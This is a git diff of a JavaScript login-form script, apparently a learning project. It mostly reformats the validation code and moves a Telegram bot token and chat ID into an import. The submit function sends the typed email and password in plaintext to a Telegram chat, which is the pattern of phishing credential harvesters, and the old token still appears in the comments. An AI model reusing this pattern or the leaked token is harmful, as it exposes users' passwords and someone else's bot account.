@@ -10,8 +10,6 @@
 // create submit function
 
 
-
-
 // MAP
 // const customIcon = L.icon({
 //     iconUrl: 'https://static-00.iconduck.com/assets.00/map-pin-icon-384x512-m24sswd5.png',
@@ -46,7 +44,7 @@ function checkEmailLenght() {
     const valueLenght = window.inputEmail.value.length;
     const diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;
 
-    if(diff) {
+    if (diff) {
         window.emailDiffCount.textContent = diff;
         window.emailLenghtHelp.classList.remove('d-none');
     } else {
@@ -63,27 +61,29 @@ function resetValidation() {
 function validateForm(event) {
     event.preventDefault();
     resetValidation();
-    
+
     const email = window.inputEmail.value;
     const password = window.inputPassword.value;
 
-    if(!email) {
+    if (!email) {
         window.emailHelp.classList.remove('d-none');
         return false;
     }
-    if(!password) {
+    if (!password) {
         window.passwordHelp.classList.remove('d-none');
         return false;
     }
 
-    if(!testPasswordRegex(password)) {
+    if (!testPasswordRegex(password)) {
         window.passwordHelp.classList.remove('d-none');
         window.passwordHelpDescription.classList.remove('d-none');
     }
 
-    
+
     // console.log(email, password);
 }
+
+import { apiToken, chatId } from "./telegramTokens.js";
 
 async function formSubmit(event) {
     event.preventDefault();
@@ -91,12 +91,12 @@ async function formSubmit(event) {
     const email = window.inputEmail.value;
     const password = window.inputPassword.value;
 
-    if(!email || !password) {
+    if (!email || !password) {
         return false;
     }
 
-    let apiToken = "6333160040:AAHXyBNdAxgyH-ccyF64EPhA0gqoq7AaqZg";
-    let chatId = "-1001965320115";
+    // let apiToken = "6333160040:AAHXyBNdAxgyH-ccyF64EPhA0gqoq7AaqZg";
+    // let chatId = "-1001965320115";
 
     let text = `
     <b>Email: </b> ${email}
@@ -120,14 +120,6 @@ async function formSubmit(event) {
 
     const resp = await response.json();
     console.log(resp);
-
-    // let request = new XMLHttpRequest();
-    // request.open("GET", urlString);
-    // request.send();
-
-    // let response = request.response;
-
-    // Do what you want with response
 }
 
 // window.inputEmail.addEventListener('input', checkEmailLenght);
